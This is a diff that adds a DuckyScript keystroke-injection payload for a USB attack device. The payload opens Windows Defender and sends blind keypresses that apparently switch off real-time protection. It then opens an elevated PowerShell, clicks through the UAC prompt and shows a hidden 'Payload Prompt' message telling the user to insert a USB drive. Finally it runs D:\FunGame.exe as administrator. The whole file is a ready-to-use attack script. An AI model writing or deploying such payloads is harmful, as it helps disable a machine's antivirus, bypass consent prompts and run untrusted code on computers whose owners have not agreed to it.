@@ -1,0 +1,74 @@
+REM Open Run dialog
+DELAY 1500
+GUI r
+DELAY 1500
+
+REM open defender
+STRING windowsdefender:
+DELAY 1500
+
+REM First Enter
+ENTER
+DELAY 1500
+
+REM Second Enter
+ENTER
+DELAY 1500
+
+REM Tab 4 times
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 1500
+
+REM Press Enter
+ENTER
+DELAY 1500
+
+REM Press Space
+SPACE
+DELAY 1500
+
+
+REM Press Left Arrow
+LEFTARROW
+DELAY 1500
+
+REM Final Enter
+ENTER
+DELAY 1500
+
+GUI r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+
+DELAY 3000
+ENTER
+DELAY 2000
+LEFTARROW
+DELAY 2000
+ENTER
+DELAY 2000
+
+REM Show message box and wait 15 seconds to plug in USB
+STRING powershell -windowstyle hidden -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Plug in USB now — 15 seconds...','Payload Prompt'); Start-Sleep -Seconds 15"
+ENTER
+DELAY 20000
+GUI r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+
+DELAY 3000
+ENTER
+DELAY 2000
+LEFTARROW
+DELAY 2000
+ENTER
+DELAY 2000
+
+REM Detect USB labeled MYUSB, copy FunGame.exe, execute, keep window open
+STRING Start-Process "D:\FunGame.exe"
+ENTER
+DELAY 3000
